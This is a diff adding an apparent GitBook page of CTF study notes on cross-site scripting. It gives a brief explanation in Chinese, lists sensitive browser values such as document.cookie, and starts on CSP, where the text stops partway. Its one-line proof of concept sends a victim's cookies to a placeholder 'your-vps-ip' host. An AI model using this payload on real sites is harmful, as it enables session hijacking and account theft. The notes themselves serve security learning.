@@ -1,0 +1,1626 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>XSS · Eki's CTF</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Eki">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="shell.html" />
+    
+    
+    <link rel="prev" href="xxe.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    About
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Library
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="steganography.html">
+            
+                <a href="steganography.html">
+            
+                    
+                    Steganography
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="gdb-tutorial.html">
+            
+                <a href="gdb-tutorial.html">
+            
+                    
+                    GDB Tutorial
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="sqli.html">
+            
+                <a href="sqli.html">
+            
+                    
+                    SQL Inject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="php/function.html">
+            
+                <a href="php/function.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="php/protocol.html">
+            
+                <a href="php/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="php/ace.html">
+            
+                <a href="php/ace.html">
+            
+                    
+                    ACE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="php/serialize.html">
+            
+                <a href="php/serialize.html">
+            
+                    
+                    Serialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="php/misc.html">
+            
+                <a href="php/misc.html">
+            
+                    
+                    Misc
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="htaccess.html">
+            
+                <a href="htaccess.html">
+            
+                    
+                    Apache .htaccess
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="ssti.html">
+            
+                <a href="ssti.html">
+            
+                    
+                    SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="ssrf.html">
+            
+                <a href="ssrf.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="xxe.html">
+            
+                <a href="xxe.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.9" data-path="xss.html">
+            
+                <a href="xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="shell.html">
+            
+                <a href="shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="crypto.html">
+            
+                <a href="crypto.html">
+            
+                    
+                    Crypto
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="js.html">
+            
+                <a href="js.html">
+            
+                    
+                    JavaScript
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="python.html">
+            
+                <a href="python.html">
+            
+                    
+                    Python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="bash.html">
+            
+                <a href="bash.html">
+            
+                    
+                    BASH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="forensics.html">
+            
+                <a href="forensics.html">
+            
+                    
+                    Forensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="pentest.html">
+            
+                <a href="pentest.html">
+            
+                    
+                    Pentest
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="protocol.html">
+            
+                <a href="protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="misc.html">
+            
+                <a href="misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="awd.html">
+            
+                <a href="awd.html">
+            
+                    
+                    AWD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../contest/">
+            
+                <a href="../contest/">
+            
+                    
+                    Contest
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
+            
+                <a href="../contest/hfctf-2021.html">
+            
+                    
+                    2021数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
+            
+                <a href="../contest/hackergame-2019.html">
+            
+                    
+                    Hackergame 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
+            
+                <a href="../contest/tsctf-j2019.html">
+            
+                    
+                    TSCTF-J 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
+            
+                <a href="../contest/nctf2019.html">
+            
+                    
+                    NCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
+            
+                <a href="../contest/isoon-2019.html">
+            
+                    
+                    ISOON 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
+            
+                <a href="../contest/mrctf-2020.html">
+            
+                    
+                    MRCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
+            
+                <a href="../contest/hfctf-2020.html">
+            
+                    
+                    2020数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
+            
+                <a href="../contest/npuctf-2020.html">
+            
+                    
+                    NPUCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
+            
+                <a href="../contest/gkctf-2020.html">
+            
+                    
+                    GKCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
+            
+                <a href="../contest/sctf-2020.html">
+            
+                    
+                    SCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../adworld/">
+            
+                <a href="../adworld/">
+            
+                    
+                    ADworld
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../adworld/misc-exercise-area.html">
+            
+                <a href="../adworld/misc-exercise-area.html">
+            
+                    
+                    Misc Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../adworld/crypto-execrise-area.html">
+            
+                <a href="../adworld/crypto-execrise-area.html">
+            
+                    
+                    Crypto Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../adworld/web-execrise-area.html">
+            
+                <a href="../adworld/web-execrise-area.html">
+            
+                    
+                    Web Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../adworld/pwn-exercise-area.html">
+            
+                <a href="../adworld/pwn-exercise-area.html">
+            
+                    
+                    PWN Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../adworld/reverse-execrise-area.html">
+            
+                <a href="../adworld/reverse-execrise-area.html">
+            
+                    
+                    Reverse Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="../adworld/easy_tornado.html">
+            
+                <a href="../adworld/easy_tornado.html">
+            
+                    
+                    Easy Tornado
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="../adworld/i-got-id-200.html">
+            
+                <a href="../adworld/i-got-id-200.html">
+            
+                    
+                    i-got-id-200
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="../adworld/ics-02.html">
+            
+                <a href="../adworld/ics-02.html">
+            
+                    
+                    ics-02
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="../adworld/ics-07.html">
+            
+                <a href="../adworld/ics-07.html">
+            
+                    
+                    ics-07
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="../adworld/shrine.html">
+            
+                <a href="../adworld/shrine.html">
+            
+                    
+                    shrine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="../adworld/super_sqli.html">
+            
+                <a href="../adworld/super_sqli.html">
+            
+                    
+                    super_sqli
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="../adworld/web_php_unserialize.html">
+            
+                <a href="../adworld/web_php_unserialize.html">
+            
+                    
+                    Web_php_unserialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="../adworld/web_php_wrong_nginx_config.html">
+            
+                <a href="../adworld/web_php_wrong_nginx_config.html">
+            
+                    
+                    web_php_wrong_nginx_config
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="../adworld/web_python_template_injection.html">
+            
+                <a href="../adworld/web_python_template_injection.html">
+            
+                    
+                    Web_python_template_injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="../adworld/wtf.sh-150.html">
+            
+                <a href="../adworld/wtf.sh-150.html">
+            
+                    
+                    wtf.sh-150
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="../adworld/zhuanxv.html">
+            
+                <a href="../adworld/zhuanxv.html">
+            
+                    
+                    Zhuanxv
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../buuoj/">
+            
+                <a href="../buuoj/">
+            
+                    
+                    BUUOJ
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
+            
+                <a href="../buuoj/ciscn-northeast-2019.html">
+            
+                    
+                    CISCN 2019 华北赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
+            
+                <a href="../buuoj/ciscn-pre-2019.html">
+            
+                    
+                    CISCN 2019 初赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
+            
+                <a href="../buuoj/ciscn-final-2019.html">
+            
+                    
+                    CISCN 2019 Final
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
+            
+                <a href="../buuoj/wangdingcup-2018.html">
+            
+                    
+                    网鼎杯 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
+            
+                <a href="../buuoj/wangdingcup-2019.html">
+            
+                    
+                    网鼎杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
+            
+                <a href="../buuoj/roarctf-2019.html">
+            
+                    
+                    RoarCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
+            
+                <a href="../buuoj/0ctf-2016.html">
+            
+                    
+                    0CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
+            
+                <a href="../buuoj/gxyctf-2019.html">
+            
+                    
+                    GXYCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
+            
+                <a href="../buuoj/hitcon-2017.html">
+            
+                    
+                    Hitcon 2017
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
+            
+                <a href="../buuoj/jikedatiaozhan-2019.html">
+            
+                    
+                    极客大挑战2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
+            
+                <a href="../buuoj/lctf-2018.html">
+            
+                    
+                    LCTF 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
+            
+                <a href="../buuoj/swpu-2019.html">
+            
+                    
+                    SWPU 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
+            
+                <a href="../buuoj/bjdctf-2020.html">
+            
+                    
+                    BJDCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
+            
+                <a href="../buuoj/rctf-2015.html">
+            
+                    
+                    RCTF 2015
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
+            
+                <a href="../buuoj/bytectf-2019.html">
+            
+                    
+                    ByteCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
+            
+                <a href="../buuoj/qiangwangbei-2019.html">
+            
+                    
+                    强网杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
+            
+                <a href="../buuoj/ddctf-2019.html">
+            
+                    
+                    DDCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
+            
+                <a href="../buuoj/eis-2019.html">
+            
+                    
+                    EIS 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
+            
+                <a href="../buuoj/vn-2020.html">
+            
+                    
+                    V&N 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
+            
+                <a href="../buuoj/fbctf-2019.html">
+            
+                    
+                    FBCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GYCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
+            
+                <a href="../buuoj/bjd-2nd.html">
+            
+                    
+                    BJDCTF 2nd
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
+            
+                <a href="../buuoj/fireshellctf-2020.html">
+            
+                    
+                    FireShellCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GWCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
+            
+                <a href="../buuoj/watevrctf-2019.html">
+            
+                    
+                    WatervrCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
+            
+                <a href="../buuoj/ciscn-southeast-2019.html">
+            
+                    
+                    CISCN2019 华东南赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
+            
+                <a href="../buuoj/bsidescf-2019.html">
+            
+                    
+                    BsidesCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
+            
+                <a href="../buuoj/rctf-2019.html">
+            
+                    
+                    RCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
+            
+                <a href="../pwnable.kr/">
+            
+                    
+                    pwnable.kr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
+            
+                <a href="../pwnable.kr/toddlers-bottle.html">
+            
+                    
+                    Toddler's Bottle
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
+            
+                <a href="../ethernaut/">
+            
+                    
+                    Ethernaut
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
+            
+                <a href="../vulnhub/">
+            
+                    
+                    Vulnhub
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
+            
+                <a href="../vulnhub/dc-9.html">
+            
+                    
+                    DC-9
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
+            
+                <a href="../vulnhub/five86-1.html">
+            
+                    
+                    five86-1
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
+            
+                <a href="../vulnhub/wakanda.html">
+            
+                    
+                    wakanda
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >XSS</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#xss"><b></b>XSS</a></li><ul><li><span class="title-icon "></span><a href="#&#x57FA;&#x672C;&#x601D;&#x8DEF;"><b></b>&#x57FA;&#x672C;&#x601D;&#x8DEF;</a></li><li><span class="title-icon "></span><a href="#iframe"><b></b>iframe</a></li><li><span class="title-icon "></span><a href="#&#x56FE;&#x7247;"><b></b>&#x56FE;&#x7247;</a></li><ul><li><span class="title-icon "></span><a href="#png"><b></b>PNG</a></li></ul><li><span class="title-icon "></span><a href="#csp&#x76F8;&#x5173;"><b></b>CSP&#x76F8;&#x5173;</a></li><ul><li><span class="title-icon "></span><a href="#&#x540C;&#x6E90;&#x7B56;&#x7565;"><b></b>&#x540C;&#x6E90;&#x7B56;&#x7565;</a></li></ul><li><span class="title-icon "></span><a href="#cheatsheet"><b></b>CheatSheet</a></li></ul></ul></div><a href="#xss" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="xss"><a name="xss" class="anchor-navigation-ex-anchor" href="#xss"><i class="fa fa-link" aria-hidden="true"></i></a>XSS</h1>
+<h2 id="&#x57FA;&#x672C;&#x601D;&#x8DEF;"><a name="&#x57FA;&#x672C;&#x601D;&#x8DEF;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x672C;&#x601D;&#x8DEF;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x57FA;&#x672C;&#x601D;&#x8DEF;</h2>
+<p>xss&#x7684;&#x76EE;&#x7684;&#x5728;&#x4E8E;&#x524D;&#x7AEF;&#x7F51;&#x9875;&#x4E2D;&#x6CE8;&#x5165;&#x6076;&#x610F;js&#x4EE3;&#x7801;&#xFF0C;&#x4F7F;&#x5F97;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8BBF;&#x95EE;&#x8BE5;&#x7F51;&#x9875;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x8FDB;&#x884C;&#x6076;&#x610F;&#x64CD;&#x4F5C;</p>
+<p>&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;</p>
+<pre><code>document.cookie
+document.location.href
+top.location.href
+window.opener.location.href
+...
+</code></pre><p>&#x6700;&#x7B80;&#x5355;&#x7684;poc</p>
+<pre><code class="lang-js">&lt;script&gt;window.open(&quot;http://your-vps-ip/&quot;+document.cookie)&lt;/script&gt;
+</code></pre>
+<p>window.open &#x53EF;&#x4EE5;&#x66FF;&#x6362;&#x4E3A; window.location.href</p>
+<h2 id="iframe"><a name="iframe" class="anchor-navigation-ex-anchor" href="#iframe"><i class="fa fa-link" aria-hidden="true"></i></a>iframe</h2>
+<h2 id="&#x56FE;&#x7247;"><a name="&#x56FE;&#x7247;" class="anchor-navigation-ex-anchor" href="#&#x56FE;&#x7247;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x56FE;&#x7247;</h2>
+<h3 id="png"><a name="png" class="anchor-navigation-ex-anchor" href="#png"><i class="fa fa-link" aria-hidden="true"></i></a>PNG</h3>
+<p>&#x53C2;&#x8003;&#x94FE;&#x63A5; <a href="https://xz.aliyun.com/t/7530" target="_blank">https://xz.aliyun.com/t/7530</a></p>
+<h2 id="csp&#x76F8;&#x5173;"><a name="csp&#x76F8;&#x5173;" class="anchor-navigation-ex-anchor" href="#csp&#x76F8;&#x5173;"><i class="fa fa-link" aria-hidden="true"></i></a>CSP&#x76F8;&#x5173;</h2>
+<blockquote>
+<p>CSP &#x7684;&#x4E3B;&#x8981;&#x76EE;&#x6807;&#x662F;&#x51CF;&#x5C11;&#x548C;&#x62A5;&#x544A; XSS &#x653B;&#x51FB; &#xFF0C;XSS &#x653B;&#x51FB;&#x5229;&#x7528;&#x4E86;&#x6D4F;&#x89C8;&#x5668;&#x5BF9;&#x4E8E;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x6240;&#x83B7;&#x53D6;&#x7684;&#x5185;&#x5BB9;&#x7684;&#x4FE1;&#x4EFB;&#x3002;&#x6076;&#x610F;&#x811A;&#x672C;&#x5728;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x5F97;&#x4EE5;&#x8FD0;&#x884C;&#xFF0C;&#x56E0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x4FE1;&#x4EFB;&#x5176;&#x5185;&#x5BB9;&#x6765;&#x6E90;&#xFF0C;&#x5373;&#x4F7F;&#x6709;&#x7684;&#x65F6;&#x5019;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x5E76;&#x975E;&#x6765;&#x81EA;&#x4E8E;&#x5B83;&#x672C;&#x8BE5;&#x6765;&#x7684;&#x5730;&#x65B9;&#x3002;
